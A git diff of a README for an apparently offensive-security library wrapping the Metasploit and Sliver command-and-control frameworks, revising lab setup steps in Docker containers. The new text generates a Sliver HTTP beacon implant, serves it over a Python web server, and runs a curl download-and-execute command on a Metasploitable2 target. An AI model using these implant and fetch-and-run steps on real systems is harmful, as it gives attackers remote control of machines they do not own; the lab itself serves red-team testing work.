@@ -1,4 +1,4 @@
-# Eshu Python Library v4
+# Eshu Python Library v5
 
 Common Language Platform for multiple Command and Control Frameworks
 
@@ -24,57 +24,43 @@ ping 10.1.1.3
 nmap -l metasploitable2
 ```
 
-#### Firstly, testing Metasploit with main.py
-In the terminal
+#### Firstly, setting up Sliver Server
+In one terminal (Sliver Server):
 ```bash
-python eshuCLP/main.py
-```
-
-#### Secondly, testing Sliver with server/client instances
-In the same terminal
-```bash
-sliver-server
-```
-This launches the sliver server. In sliver server console
-```console
-new-operator --name operator1 --lhost localhost
-multiplayer
-```
-
-In a second terminal launch into the operator machine
-```console
 docker exec -it operator /bin/bash
-```
-Then in operator's bash terminal to connect operator to sliver-server using main.py
-```bash
-python eshuCLP/main.py
-```
-
-#### To throw an exploit using Sliver
-GO back to the sliver terminal. If exited, start up again
-```bash
 sliver-server
+> new-operator --name operator1 --lhost localhost
+> multiplayer
 ```
 
-In sliver server console, generate implant
-```console
-generate --dns 10.1.1.3 --os linux --arch amd64 --format elf --save /workspace/
+#### Secondly, setting up Sliver Client instance
+In second terminal (Sliver Client):
+```bash
+docker exec -it operator /bin/bash
+sliver-client import operator1_localhost.cfg
+sliver-client
+> generate beacon --seconds 5 --jitter 0 --http 10.1.1.2 --os linux --arch amd64 --name testbeacon
+> http	
 ```
 
-Start listener and list jobs
-```console
-mtls
-jobs
+#### Thirdly, set up server to transfer implant for exploitation
+In third terminal (operator workspace):
+```bash
+docker exec -it operator /bin/bash
+python -m http.server 8080
 ```
 
-In operator, verify port 8888 is open
-```console
-netstat -antop | grep 8888
+#### Fourth, download and run implant on vulnerable machine
+In fourth terminal (metasploitable2):
+```bash
+docker exec -it metasploitable2 /bin/bash
+curl -O http://10.1.1.2:8080/testbeacon && chmod +x testbeacon && sudo service apache2 stop && ./testbeacon
+
 ```
 
-Check that elf implant file was created in operator
-```console
-ls
+#### Lastly, run main.py for simultaneous Metasploit and Sliver behavior
+```bash 
+python eshuCLP/main.py
 ```
 
 #### Clean Up
